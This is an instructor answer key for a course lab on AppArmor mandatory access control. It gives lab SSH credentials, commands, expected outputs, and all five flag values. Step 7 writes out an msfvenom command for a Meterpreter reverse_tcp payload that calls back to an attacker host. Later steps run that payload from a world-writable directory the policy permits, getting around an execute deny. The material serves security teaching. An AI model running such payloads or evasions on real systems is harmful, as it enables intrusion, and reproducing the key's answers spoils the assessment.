---
id: B03.M03.lab-2.2-answer-key
title: Lab 2.2 Answer Key
artifact_type: answer_key
audience: instructor
block: B03
legacy_aliases:
- week3_repo/docs/assessment/lab-2.2-answer-key.md
- B04.M14
source_kind: markdown
render_mode: generate
source_status: authored
review_required: false
output_formats:
- docx
- pdf
sensitivity: course_internal
---
# Lab 2.2 — AppArmor Objective Impact Lab — Answer Key (Instructor Only)

Use this as a live walkthrough. The goal is to start from the same shell access students receive, prove AppArmor is actively shaping outcomes, show a blocked objective path, pivot to an allowed path without privilege escalation, and recover all five flags.

## Access

| Hostname (expected) | IP address  | Username | Password         | Connection   |
| ------------------- | ----------- | -------- | ---------------- | ------------ |
| `cow-22`            | 20.30.40.22 | `badguy` | `badGuy!QAZ1qaz` | SSH (TCP 22) |

If the instructor or range card provides a different login, use those assigned values.

## Flag Reference

| Flag ID | Default location in the default build | Hiera key | Default value (if key omitted) |
|--------|----------------------------------------|-----------|--------------------------------|
| `mac_id_flag` | Output of `/usr/local/bin/system-maint-check` | `cs_ops::lab_2_2::flags::mac_id_flag` | `AEGIS-MARK` |
| `denial_flag` | Native AppArmor denial evidence (for blocked run) visible in one of: `dmesg`, `journalctl -k`, or `/var/log/syslog`/`/var/log/kern.log` | `cs_ops::lab_2_2::flags::denial_flag` | `THORN-BARRIER` |
| `upload_flag` | Output of `/usr/local/bin/objective-gate-check` after successful execution from allowed path | `cs_ops::lab_2_2::flags::upload_flag` | `VECTOR-ASCENT` |
| `allowed_path_flag` | Output of `/usr/local/bin/objective-gate-check` after successful execution from allowed path | `cs_ops::lab_2_2::flags::allowed_path_flag` | `CLEAR-PASSAGE` |
| `objective_flag` | Process-context objective from `runtime-cache-worker` environment (`OBJECTIVE_FLAG` via `/proc/<pid>/environ`) | `cs_ops::lab_2_2::flags::objective_flag` | `RUNTIME-NEXUS` |

Set under `cs_ops::lab_2_2::flags` in Hiera (example: `environments/week3_repo/vms/puppet/data/nodes/lab_2_2.yaml`). Defaults are defined in `environments/week3_repo/vms/puppet/modules/cs_ops/manifests/lab_2_2.pp`.

## Recommended Instructor Walkthrough

### 1. Connect and establish situational awareness baseline

Run:

```bash
ssh badguy@<target-ip>
date -u
hostname
whoami
id
pwd
echo "$SHELL"
ps -p $$ -o pid,ppid,args=
env | sort | sed -n '1,20p'
uname -a
cat /etc/os-release
who
w
ps aux
ss -tulpen
ss -tunap
```

Why:
- This is the B03.M01 Linux SA first pass after SSH, before MAC work. Record time, identity, shell/process chain, OS, users, processes, and sockets so later AppArmor evidence has a host baseline.
- This is a normal SSH host (unlike Lab 2.1). Socket listing is orientation, not the flag hunt. Lab 2.2 answers are in policy, logs, and process context.

Arguments:
- `date -u` — UTC, so kernel-log timestamps can be correlated later.
- `ps -p $$ -o pid,ppid,args=` — `$$` is this shell; show its PID, PPID, and args.
- `env | sort | sed -n '1,20p'` — `sed -n '1,20p'` prints lines 1–20 so the demo stays short.
- `ss -tulpen` — TCP/UDP listeners; `-p` process, `-n` numeric. `ss -tunap` is established/active sockets.

### 2. Confirm AppArmor is active

Run:

```bash
aa-status
```

Why:
- After SA, student task 1 is confirm AppArmor. `aa-status` is the native status tool. As an unprivileged user it confirms the module is loaded but cannot enumerate profiles or enforcement mode.
- That privilege limitation is expected and is itself evidence: the student is operating without root, so profile details must come from the policy files on disk.

Expected output:

```text
apparmor module is loaded.
You do not have enough privilege to read the profile set.
```

Acceptable student conclusion:
- "AppArmor is loaded. I cannot read profile state from `aa-status` without root. Next step: inspect `/etc/apparmor.d` directly."

### 3. Enumerate AppArmor profiles and identify governed binaries

Run:

```bash
ls -la /etc/apparmor.d/
```

Why:
- `/etc/apparmor.d` is the standard directory for AppArmor profile source files. Since `aa-status` could not list profiles, this is the next discoverable path.
- AppArmor profile filenames encode the full path of the governed binary with dots replacing slashes (for example `usr.local.bin.objective-gate-check` governs `/usr/local/bin/objective-gate-check`). That naming convention is how students identify which binaries on this host are policy-controlled.

Expected findings (lab-specific profiles among standard ones):
- `usr.local.bin.system-maint-check` → governs `/usr/local/bin/system-maint-check`
- `usr.local.bin.objective-gate-check` → governs `/usr/local/bin/objective-gate-check`
- `usr.local.sbin.runtime-cache-worker` → governs `/usr/local/sbin/runtime-cache-worker`

These filenames tell us to look in `/usr/local/bin` and `/usr/local/sbin`. That is the only reason those directories are examined next.

Run:

```bash
ls -la /usr/local/bin
ls -la /usr/local/sbin
```

Why:
- The profile filenames point here. Listing confirms the binaries exist, are executable, and shows any other local tools students might encounter.

Expected findings:
- `/usr/local/bin/system-maint-check`
- `/usr/local/bin/objective-gate-check`
- `/usr/local/sbin/runtime-cache-worker`

### 4. Read the gate profile to understand deny and allow rules

Run:

```bash
sed -n '1,80p' /etc/apparmor.d/usr.local.bin.objective-gate-check
```

Why:
- Of the three profiles, `objective-gate-check` matches the student task (exercise a gate script against an uploaded binary). That task alignment is why this profile is read first, not the other two.
- The profile shows the deny and allow rules that will drive the rest of the lab.

Arguments:
- `sed -n '1,80p'` — print a bounded window rather than unbounded `cat`.

Expected gate-profile excerpt:

```text
/usr/local/bin/objective-gate-check flags=(enforce) {
  /home/badguy/downloads/** rwkl,
  deny /home/badguy/downloads/** x,
  /var/tmp/.cache-bin/** rix,
}
```

Why these stanzas matter:
- `rwkl` on `/home/badguy/downloads/**` — students can write (upload) files there.
- `deny … x` on the same tree — execute is blocked from the upload directory.
- `rix` on `/var/tmp/.cache-bin/**` — read, inherit, execute is allowed from this path. This is the pivot directory for later steps. It is a world-writable sticky dir, not a privilege escalation.

### 5. Review the runtime README (instructor breadcrumb gap)

Run:

```bash
sed -n '1,80p' /usr/share/doc/system-runtime/README.runtime
```

Why:
- This file is Puppet-created lab documentation that outlines the full objective workflow. It is placed at a standard location under `/usr/share/doc`, but **no artifact discovered in Steps 1–4 currently points students to it**. In a live demo the instructor can direct students here, but for unassisted student work this is a gap.

> **Instructor action required:** Either add a breadcrumb to `/usr/share/doc/system-runtime/README.runtime` in an artifact students have already found (for example in the output of `system-maint-check` or the gate profile comments), or add a clue in the student handout for Lab 2.2 directing students to check `/usr/share/doc` for host documentation after confirming AppArmor. Do not update the student handout in this change; track this as a separate follow-up.

Expected `sed -n '1,80p' /usr/share/doc/system-runtime/README.runtime` excerpt:

```text
# Runtime Control Notes
1) Confirm AppArmor is active and enforcing policy.
2) Upload a remote-shell style payload binary under your writable area.
3) Use /usr/local/bin/objective-gate-check to test a blocked execution path and inspect native AppArmor evidence (dmesg, journalctl -k, syslog/kern.log).
4) Discover an allowed execution path by inspecting AppArmor profiles under /etc/apparmor.d.
5) Execute the payload directly from an allowed path, then run /usr/local/bin/objective-gate-check again against the running payload to recover gate flags.
6) Discover one objective via process context: identify runtime-cache-worker process details and inspect `/proc/<pid>/environ` for objective evidence.
7) Collect the five flags:
   - mac_id_flag from /usr/local/bin/system-maint-check
   - denial_flag from native AppArmor denial evidence
   - upload_flag and allowed_path_flag from successful gate validation
   - objective_flag from process context evidence
```

### 6. Recover flag 1 (`mac_id_flag`)

Run:

```bash
sed -n '1,80p' /usr/local/bin/system-maint-check
/usr/local/bin/system-maint-check
```

Why:
- Step 3 identified this binary from the AppArmor profile filename `usr.local.bin.system-maint-check`. The README (Step 5) confirms `mac_id_flag` comes from it. Inspect first because it is a lab script: confirm it only prints status/flag evidence and does not modify the host.
- Running it (not stopping at `sed`) is required because the flag is base64-obfuscated in the file. `cat` is not a complete solve.

Arguments:
- `sed -n '1,80p'` — bounded inspect of the helper, same reason as Step 4.

Expected finding:
- Output includes `mac_id_flag=...`.

Expected helper inspect excerpt:

```sh
echo 'AppArmor profile located. Validate with aa-status.'
echo "mac_id_flag=$(printf '%s' '<b64>' | /usr/bin/base64 -d)"
```

Expected helper output:

```text
AppArmor profile located. Validate with aa-status.
mac_id_flag=AEGIS-MARK
```

Flag recovered:
- `mac_id_flag` = `AEGIS-MARK` by default.

### 7. Upload a remote-shell binary and demonstrate blocked objective path

From attacker host, generate and upload a remote-shell style payload (Meterpreter example):

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=4445 -f elf -o /tmp/runtime_probe.elf
scp /tmp/runtime_probe.elf badguy@<target-ip>:/home/badguy/downloads/runtime_probe.elf
```

Why:
- The upload directory is not guessed: the README says “writable area,” a home listing shows `downloads`, and the Step 4 profile grants `rwkl` while denying `x` on `/home/badguy/downloads`.
- Any student-supplied executable is acceptable. Meterpreter is one example, not a required payload.

Arguments:
- `-p linux/x64/meterpreter/reverse_tcp` — payload type.
- `LHOST` / `LPORT` — instructor-chosen ops-station callback (example 4445; not a lab tunable).
- `-f elf -o …` — write an ELF file.

On target:

```bash
sed -n '1,120p' /usr/local/bin/objective-gate-check
chmod +x /home/badguy/downloads/runtime_probe.elf
/usr/local/bin/objective-gate-check /home/badguy/downloads/runtime_probe.elf
echo $?
```

Why:
- Inspect the gate before use because it is a lab helper. Usage is `objective-gate-check <binary_path>`. On an upload-dir path the script creates `.aa-deny-<denial_flag>-<epoch>` and tries to exec that name. AppArmor denies `x`, which is why the later kernel `name=` field contains the flag. Failure text then names dmesg, journalctl, and syslog.
- `chmod +x` is required for an exec check. `echo $?` records the non-zero blocked status. Do not take flags 3–4 from this failed run.

Arguments:
- `sed -n '1,120p'` — bounded inspect of the gate script.

Expected behavior:
- Gate execution from upload path fails.
- Failure message indicates blocked/failed execution under current constraints.

Expected gate failure output:

```text
Execution blocked from upload path under current MAC policy.
Collect native evidence from dmesg, journalctl -k, or syslog/kern.log.
```

### 8. Recover flag 2 (`denial_flag`) from native AppArmor evidence

Run an unfiltered (or bounded) native read first. After AppArmor lines are visible, the `grep` forms below are optional noise reduction.

**Option A: `dmesg`**

```bash
dmesg
# Optional after AppArmor lines are visible:
# dmesg | grep -i apparmor | tail -n 40
```

**Option B: `journalctl -k`**

```bash
journalctl -k --no-pager
# Optional after AppArmor lines are visible:
# journalctl -k --no-pager | grep -i apparmor | tail -n 40
```

**Option C: `/var/log/syslog` or `/var/log/kern.log`**

```bash
sed -n '1,80p' /var/log/syslog
sed -n '1,80p' /var/log/kern.log
# Optional after AppArmor lines are visible:
# grep -i apparmor /var/log/syslog | tail -n 40
# grep -i apparmor /var/log/kern.log | tail -n 40
```

Why:
- Step 7 gate stderr named these three native families. AppArmor denials are kernel LSM events, so `dmesg`, `journalctl -k`, and syslog/kern.log are the same evidence family, not three different puzzles.
- The denied `name=` path is the symlink the gate built, not a file the student created. Parse `denial_flag` as the segment after `.aa-deny-` and before `-<epoch>`.

Arguments:
- `journalctl -k --no-pager` — `-k` kernel messages; `--no-pager` so the demo does not stop in `less`.
- Optional `grep -i apparmor | tail -n 40` — case-insensitive AppArmor filter; last 40 lines after the denial was just generated.

Expected finding:
- One native evidence source shows the AppArmor denial entry for the blocked run.
- The denial artifact includes the `denial_flag` token in the denied-path marker.

Expected denial evidence excerpt:

```text
apparmor="DENIED" operation="exec" profile="/usr/local/bin/objective-gate-check" name="/home/badguy/downloads/.aa-deny-THORN-BARRIER-<timestamp>"
```

Flag recovered:
- `denial_flag` = `THORN-BARRIER` by default.

### 9. Pivot to allowed action, run payload first, then recover flags 3 + 4

Re-read the gate profile already opened in Step 4, then copy the same payload into the allowed directory. Teach the path from the `/** rix,` line by eye. The `sed` extractor is optional shorthand after that line is identified.

```bash
sed -n '1,80p' /etc/apparmor.d/usr.local.bin.objective-gate-check
cp /home/badguy/downloads/runtime_probe.elf /var/tmp/.cache-bin/runtime_probe.elf
chmod +x /var/tmp/.cache-bin/runtime_probe.elf
```

Optional after the `/** rix,` line is identified:

```bash
ALLOWED_DIR="$(sed -n 's/^\s*\(\/[^ ]*\)\/\*\* rix,/\1/p' /etc/apparmor.d/usr.local.bin.objective-gate-check | head -n1)"
cp /home/badguy/downloads/runtime_probe.elf "${ALLOWED_DIR}/runtime_probe.elf"
chmod +x "${ALLOWED_DIR}/runtime_probe.elf"
```

Why:
- Return to the gate profile because Step 4 already showed `/var/tmp/.cache-bin/** rix,` versus `deny … x` on downloads. Same binary, different path, no policy edit, no sudo.
- Copy then `chmod +x` into that directory because execute is allowed only there.

Arguments:
- `sed -n 's/^\s*\(\/[^ ]*\)\/\*\* rix,/\1/p'` — pull the directory from the `/** rix,` line already identified by eye. Do not use this one-liner as the primary demo.

Start the payload from the allowed path, then run the gate against that same path:

```bash
/var/tmp/.cache-bin/runtime_probe.elf &
/usr/local/bin/objective-gate-check /var/tmp/.cache-bin/runtime_probe.elf
```

Why:
- Start the payload from the allowed path **before** the gate because the gate does not exec the binary on success. It `pgrep`s for that path and only then prints `upload_flag` and `allowed_path_flag`. Wrong order is not an AppArmor deny.
- If Meterpreter was used, have a listener ready. A callback proves allowed exec; it is not a flag source.

Arguments:
- `/var/tmp/.cache-bin/runtime_probe.elf &` — `&` backgrounds so the SSH session stays usable.

Expected wrong-order output (payload not started yet):

```text
Payload not currently running. Start your remote-shell payload first, then run gate again.
```

Expected behavior:
- Direct payload execution from allowed path succeeds (for example, callback/session appears on attacker listener).
- Gate run succeeds from allowed path.
- Output includes:
  - `upload_flag=...`
  - `allowed_path_flag=...`

Expected successful gate output:

```text
upload_flag=VECTOR-ASCENT
allowed_path_flag=CLEAR-PASSAGE
```

Flags recovered:
- `upload_flag` = `VECTOR-ASCENT` by default.
- `allowed_path_flag` = `CLEAR-PASSAGE` by default.

### 10. Recover flag 5 (`objective_flag`)

Run:

```bash
systemctl status runtime-cache-worker --no-pager
systemctl cat runtime-cache-worker --no-pager
PID="$(pgrep -f /usr/local/sbin/runtime-cache-worker | head -n1)"
tr '\0' '\n' < "/proc/${PID}/environ"
# Optional after manual review:
# tr '\0' '\n' < "/proc/${PID}/environ" | grep '^OBJECTIVE_FLAG='
```

Why:
- README item 6 (Step 5) and the student clue both say one flag is process-context runtime metadata. Step 3 listed `/usr/local/sbin/runtime-cache-worker`. `systemctl status` and `systemctl cat` map that binary to a live unit and show `EnvironmentFile=` and `ExecStart=`.
- `/proc/<pid>/environ` is the graded evidence (live process), not a guessed variable name. The env file is corroboration.

Arguments:
- `systemctl status … --no-pager` / `systemctl cat … --no-pager` — `--no-pager` avoids `less`.
- `pgrep -f /usr/local/sbin/runtime-cache-worker` — `-f` match full command line; take one PID (or use Main PID from `status`).
- `tr '\0' '\n' < /proc/${PID}/environ` — environ is NUL-separated; translate NUL to newline. Optional `grep '^OBJECTIVE_FLAG='` only after the full environ is reviewed.

Expected finding:
- A running `runtime-cache-worker` process exists in the expected context.
- Process environment includes `OBJECTIVE_FLAG=<value>`.

Expected `systemctl cat` excerpt:

```text
EnvironmentFile=/etc/default/runtime-cache-worker
ExecStart=/usr/local/sbin/runtime-cache-worker
```

Expected environment excerpt:

```text
OBJECTIVE_FLAG=RUNTIME-NEXUS
RUNTIME_CACHE_TAG=cache-maint
```

Flag recovered:
- `objective_flag` = `RUNTIME-NEXUS` by default.

### 11. Close with required report language

Students should be able to state:
- AppArmor is the active MAC system and is enforcing.
- Their initial objective path (uploaded binary in upload directory through gate) failed.
- The denial evidence source used (`dmesg`, `journalctl -k`, or `syslog`/`kern.log`) plus profile state evidence.
- Their alternate allowed path (discovered from AppArmor policy) and successful execution evidence.
- The process-context evidence used for `objective_flag`, independent of gate-success path output.

## Troubleshooting and Confirmation

- If SSH fails, confirm the ops-station login, target IP, TCP 22, and Access-table credentials versus any range-rotated values.
- If `aa-status` is missing or shows AppArmor unloaded, the host is not in the expected lab state. Reapply Puppet for `cs_ops::lab_2_2` rather than switching MAC implementations.
- If the blocked gate run produces no denial flag, check native evidence in `dmesg`, `journalctl -k`, and `/var/log/syslog` or `/var/log/kern.log`. The flag is in those logs, not in the gate stderr alone.
- If `dmesg` is permission denied, check `adm` group membership and `kernel.dmesg_restrict`. Fall back to syslog or `kern.log`.
- If the gate prints `Payload not currently running`, start the binary from the allowed path, then re-run the gate. That message is not an AppArmor deny.
- If the allowed-path pivot fails, re-read the gate profile for the `/** rix,` rule. Do not edit policy; copy the same payload into the allowed directory from that evidence.
- If `system-maint-check` or `objective-gate-check` is not found, confirm `/usr/local/bin` is in `PATH` or invoke the full path from the Step 3 listing.
- If home paths show `hunter` instead of `badguy`, the node likely still has Puppet default `cs_ops::lab_2_2::student_user`. Use the live home path; do not assume the Access-table username matches every Hiera override.
- If recovered flag strings differ from this key, grade the Hiera values on that node, not the defaults table.

## Grading Checkpoints

1. **MAC identification:** Student identifies AppArmor and shows enforcement evidence.
2. **Blocked path evidence:** Student demonstrates failed objective path from upload location.
3. **Denial validation:** Student retrieves denial evidence and `denial_flag`.
4. **Allowed pivot:** Student executes same binary successfully from allowed path via gate.
5. **Objective completion:** Student recovers all five flags with reproducible command evidence, including independent process-context recovery for `objective_flag`.

## Acceptable Answers

- Equivalent command sequences are acceptable if they prove the same points.
- Equivalent uploaded binaries are acceptable (C, Go, static tools, etc.) if they are student-supplied and executable.
- For flags, require exact value matches unless your course rubric explicitly allows partial credit.
